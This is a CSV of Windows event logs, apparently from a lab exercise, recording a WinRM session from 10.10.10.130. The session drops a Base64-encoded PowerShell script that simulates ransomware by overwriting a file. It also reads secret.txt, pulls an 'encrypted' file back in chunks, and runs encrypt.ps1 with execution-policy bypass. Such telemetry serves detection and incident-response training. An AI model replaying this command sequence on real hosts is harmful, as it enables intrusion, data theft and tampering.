"_time","Activity_Type","host.name","user.name","winlog.event_data.IpAddress","winlog.event_data.Image","winlog.event_data.TargetFilename","winlog.event_data.ScriptBlockText"
"2025-11-16T08:13:06.039+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiZGF0YV9pbXBvcnRhbnQudHh0LnJlY292ZXJlZC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQoK')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiZGF0YV9pbXBvcnRhbnQudHh0LnJlY292ZXJlZC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQoK')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:13:06.082+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:13:17.865+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat  data_important.txt.recovered.txt
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat  data_important.txt.recovered.txt
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:08:19.221+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:08:47.159+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:08:47.237+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-18T11:08:47.456+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_snctjpxy.sqt.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_snctjpxy.sqt.ps1","null
null"
"2025-11-18T11:08:47.831+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:10:00.030+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:10:00.070+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:11:00.518+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:11:00.580+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-18T11:11:00.760+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_xufcimbw.wct.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_xufcimbw.wct.ps1","null
null"
"2025-11-18T11:11:01.158+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:11:29.806+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:11:29.849+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:11:32.485+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","whoami
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
whoami
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:11:40.353+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat secret.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat secret.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:11:44.562+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:12:49.875+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:12:49.921+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:12:58.565+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat data_important.txt.recovered.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat data_important.txt.recovered.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:13:23.514+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:13:23.543+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-18T11:13:23.686+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_ymxp41bl.qaw.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_ymxp41bl.qaw.ps1","null
null"
"2025-11-18T11:13:24.080+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""3051eb5a911e5e9acc973c5e415f02cad2fb4c4e"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""3051eb5a911e5e9acc973c5e415f02cad2fb4c4e"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:13:24.086+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-11-18T11:13:24.134+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-11-18T11:13:24.141+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-11-18T11:13:24.210+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}
Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}"
"2025-11-18T11:13:24.239+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}
Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}"
"2025-11-18T11:13:24.347+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:14:01.571+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:14:01.608+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-item 'C:\Program Files\data_important.txt.encrypted').length
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-item 'C:\Program Files\data_important.txt.encrypted').length
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:14:01.663+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-18T11:14:01.786+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_4s4jcrhp.urf.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_4s4jcrhp.urf.ps1","null
null"
"2025-11-18T11:14:02.137+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt.encrypted"")
$index = 0
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt.encrypted"")
$index = 0
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:14:02.317+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-18T11:14:02.449+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_ykyq3nvf.10k.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_ykyq3nvf.10k.ps1","null
null"
"2025-11-18T11:14:02.744+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt.encrypted"")
$index = 106
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt.encrypted"")
$index = 106
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:14:51.819+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:14:51.868+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
